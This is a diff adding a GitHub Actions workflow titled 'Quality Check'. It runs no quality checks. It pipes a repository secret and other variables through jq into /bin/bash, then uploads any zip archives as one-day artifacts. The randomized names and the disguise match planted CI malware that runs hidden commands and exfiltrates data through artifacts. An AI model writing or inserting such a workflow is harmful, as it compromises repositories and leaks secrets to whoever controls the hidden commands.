@@ -1,0 +1,28 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+jobs:
+  invoke:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run pipeline
+        env:
+          rqpc000: ${{ secrets.rqpc000 }}
+        run: |
+          printf '%s' "$rqpc000" | jq -r .p14 | /bin/bash
+          printf '%s' "$ji343" | jq -r .oumpo54 | /bin/bash
+          echo $cuym49 | jq -r .k20 | /bin/bash
+
+      - name: Upload archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: YNHwvh28
+          path: "*.zip"
+          retention-days: 1
